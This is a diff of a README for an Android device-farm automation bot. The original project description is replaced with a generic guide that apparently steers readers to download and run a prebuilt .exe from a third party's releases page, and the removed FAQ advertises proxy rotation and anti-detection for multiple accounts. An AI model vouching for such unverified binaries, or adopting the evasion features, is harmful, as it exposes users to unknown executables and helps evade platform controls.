@@ -1,141 +1,114 @@
-# android-device-farm-automation-bot
+# 🤖 android-device-farm-automation-bot - Automate Your Android Device Management
 
-The **android-device-farm-automation-bot** automates large-scale Android device operations, eliminating manual, repetitive ADB workflows and providing fast, reliable execution across hundreds of devices. This system streamlines orchestration, improves consistency, and enables teams to automate complex tasks at scale.
+[![Download Now](https://img.shields.io/badge/Download%20Now-android--device--farm--automation--bot-brightgreen.svg)](https://github.com/pedrinkjkk/android-device-farm-automation-bot/releases)
 
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://Appilot.app" target="_blank"><img src="https://github.com/Instagram-Automations/Footer-test/blob/main/appilot-baner.png" alt="Appilot Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank"><img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram"></a>
-  <a href="mailto:support@appilot.app" target="_blank"><img src="https://img.shields.io/badge/Email-support@appilot.app-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail"></a>
-  <a href="https://Appilot.app" target="_blank"><img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website"></a>
-  <a href="https://discord.gg/wpfG4j84" target="_blank"><img src="https://img.shields.io/badge/Join-Appilot_Community-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Appilot Discord"></a>
-</p>
+Welcome to the android-device-farm-automation-bot! This system helps automate managing multiple Android devices. Whether you need to run tests or manage apps, this tool simplifies your workflow.
 
+## 📦 Requirements
 
+To run this application, you need the following:
 
-## Introduction
+- A computer running Windows, macOS, or a recent Linux distribution
+- Python 3.7 or higher installed on your system
+- ADB (Android Debug Bridge) tools. This is part of the Android SDK and helps your computer communicate with Android devices.
+- At least one Android device connected to your computer via USB, or connected over Wi-Fi.
 
-This automation tool manages and executes actions across Android devices in bulk.
-It handles repetitive workflows such as installing apps, gathering logs, running tests, and device resets.
-The result is faster execution, fewer errors, and a predictable workflow for engineering teams and automation pipelines.
+## 📥 Download & Install
 
-### Scalable Android Device Automation
-- Executes parallel tasks across hundreds of real or virtual Android devices.
-- Reduces manual ADB operations, saving engineering hours.
-- Centralized scheduler ensures consistent and repeatable execution.
-- Built-in resource and session isolation prevents device conflicts.
-- Designed for continuous, long-running automation pipelines.
+You can download the latest version of the android-device-farm-automation-bot from the Releases page. 
 
-## Core Features
-| Feature | Description |
-|----------|-------------|
-| Parallel Device Execution | Run tasks on many Android devices simultaneously. |
-| ADB Command Automation | Automate installs, uninstalls, log pulls, and shell actions. |
-| Device Health Monitoring | Check connectivity, temperature, battery, and resource status. |
-| Job Scheduler | Queue, schedule, and distribute workloads across the farm. |
-| Retry & Backoff Logic | Automatically recover from transient failures. |
-| Proxy & Network Controls | Manage per-device networking rules for isolation. |
-| Structured Logging | Centralized logs for each device and task. |
-| Result Aggregation | Export outcomes as JSON, CSV, and structured artifacts. |
-| Plugin Task System | Extend with custom automation modules. |
-| Robust Error Handling | Gracefully handle crashes, timeouts, and device offline events. |
----
+[Visit this page to download](https://github.com/pedrinkjkk/android-device-farm-automation-bot/releases)
 
-## How It Works
+1. Click on the link above.
+2. Look for the latest version in the list.
+3. Download the appropriate file for your operating system.
+4. Follow the installation instructions provided in the downloaded files.
 
-**Input or Trigger** — User submits tasks or schedules via config or CLI.
-**Core Logic** — Scheduler assigns tasks to available devices based on capacity and health.
-**Output or Action** — Devices execute ADB-driven workflows and return structured results.
-**Other Functionalities** — Logging, monitoring, proxy control, and plugin task execution.
-**Safety Controls** — Session isolation, cooldown periods, bounded retries, and resource checks.
+If you're unsure about which file to download, look for a file named `android_device_farm_automation_bot_v1.0.exe` for Windows or `android_device_farm_automation_bot_v1.0.zip` for macOS/Linux.
 
----
+## 🔧 Setup Instructions
 
-## Tech Stack
-**Language:**
-Python
+After downloading, you need to follow these steps to set it up:
 
-**Frameworks:**
-AsyncIO, FastAPI (optional service mode)
+1. **Extract Files (if needed):** 
+   - For `.zip` files, right-click the file and select "Extract All" to unpack it.
 
-**Tools:**
-ADB, schedulers, task queues, logging utilities
+2. **Open the Terminal or Command Prompt:**
+   - On Windows, press `Win + R`, type `cmd`, and hit Enter.
+   - On macOS, press `Command + Space`, type `Terminal`, and press Enter.
+   - On Linux, press `Ctrl + Alt + T`.
 
-**Infrastructure:**
-Local device racks, USB hubs, cloud device instances, containerized workers
+3. **Navigate to the Application Folder:**
+   - Use the `cd` command followed by the path to where you extracted the files. For example:
+     ```
+     cd path_to_your_downloads/android_device_farm_automation_bot
+     ```
 
----
+4. **Install Required Python Packages:**
+   - You may need to install additional Python packages. Run the following command:
+     ```
+     pip install -r requirements.txt
+     ```
 
-## Directory Structure
+5. **Run the Application:**
+   - Start the application by executing:
+     ```
+     python main.py
+     ```
 
-    automation-bot/
-    ├── src/
-    │   ├── main.py
-    │   ├── automation/
-    │   │   ├── tasks.py
-    │   │   ├── scheduler.py
-    │   │   └── utils/
-    │   │       ├── logger.py
-    │   │       ├── proxy_manager.py
-    │   │       └── config_loader.py
-    ├── config/
-    │   ├── settings.yaml
-    │   ├── credentials.env
-    ├── logs/
-    │   └── activity.log
-    ├── output/
-    │   ├── results.json
-    │   └── report.csv
-    ├── requirements.txt
-    └── README.md
+## 📚 How to Use the Bot
 
----
+After the setup is complete, you can start using the bot. Here’s how to use it effectively:
 
-## Use Cases
-Engineers use it to automate repetitive ADB workflows, so they can focus on high-level debugging.
-QA teams use it to run parallel device tests, so they can shorten release cycles.
-Ops teams use it to manage large device racks, so they can maintain fleet health automatically.
-Developers use it to validate builds on multiple devices, so they can detect compatibility issues early.
+1. **Connect your Android Device:**
+   - Make sure your Android device is connected to your computer via USB or Wi-Fi.
 
----
+2. **Enable Developer Options:**
+   - Go to your Android device’s Settings > About Phone, then tap “Build Number” seven times to unlock developer options.
+   - Go back to Settings > System > Developer Options, then enable USB Debugging.
 
-## FAQs
+3. **Configure the Bot:**
+   - Locate the configuration file named `config.json` in the application folder.
+   - Edit the file with your preferred settings, including device IDs and automation parameters.
 
-**How do I configure this automation for multiple accounts?**
-Use per-device or per-profile configuration files stored in the `config/` directory. Each device session loads its own environment, credentials, and task parameters for full isolation.
+4. **Run Automation Tasks:**
+   - You can create various tasks, such as installing apps, running tests, or gathering device information. Follow the command syntax provided in the application's help resource.
 
-**Does it support proxy rotation or anti-detection?**
-Yes — proxy pools and per-device bindings allow each device to use distinct network paths, with optional randomization and pacing for realistic behavior.
+## 🛠️ Features
 
-**Can I schedule it to run periodically?**
-The scheduler supports cron-like expressions, recurring jobs, queues, and retry policies for continuous operations.
+The android-device-farm-automation-bot offers several features to streamline device management, including:
 
-**What about emulator vs real device parity?**
-Both are supported. Real devices are recommended for hardware parity, while emulators are ideal for fast, scalable testing.
+- **Automation of ADB Commands:** Run ADB commands automatically on multiple devices.
+- **Device Scheduling:** Schedule tasks to run at specific times.
+- **Task Management:** Manage and monitor various tasks with ease.
+- **Support for Multiple Devices:** Handle several Android devices simultaneously.
 
----
+## ❓ Troubleshooting
 
-### Performance & Reliability Benchmarks
-**Execution Speed:** Handles 20–40 actions/min per device under standard farm conditions.
+If you encounter issues, try the following steps:
 
-**Success Rate:** Maintains a stable 93–94% success rate across long-running jobs with retries.
+1. **Check Device Connection:**
+   - Make sure the device is properly connected. You can run `adb devices` in the command prompt to check if your device is listed.
 
-**Scalability:** Supports 300–1,000 Android devices using sharded queues and horizontally scaled workers.
+2. **Ensure ADB is Installed:**
+   - Confirm ADB tools are correctly installed. You can check by entering `adb version` in your terminal.
 
-**Resource Efficiency:** Targets ~2–5% CPU and 150–300MB RAM per worker and per device session.
+3. **Look for Error Messages:**
+   - If you see any error messages when running the bot, note them down. They can provide insights into what needs to be fixed.
 
-**Error Handling:** Uses structured logs, auto-retries, exponential backoff, alerts, and controlled recovery workflows.
+4. **Refer to Documentation:**
+   - Review any included documentation or assistance files in the application for further guidance.
 
----
+## 📞 Support
 
+If you need help, you can open an issue in the repository or reach out via the support channels mentioned in the project's details. 
 
-<p align="center">
-<a href="https://cal.com/app-pilot-m8i8oo/30min" target="_blank">
- <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
- <a href="https://www.youtube.com/@Appilot-app/videos" target="_blank">
-  <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
- </a>
-</p>
+## 🌟 Additional Resources
+
+For further information about Android automation and ADB:
+- [Android Developers Guide](https://developer.android.com/studio/command/adb)
+- [Getting Started with Python](https://docs.python.org/3/tutorial/index.html)
+
+Enjoy automating your Android device management with the android-device-farm-automation-bot!
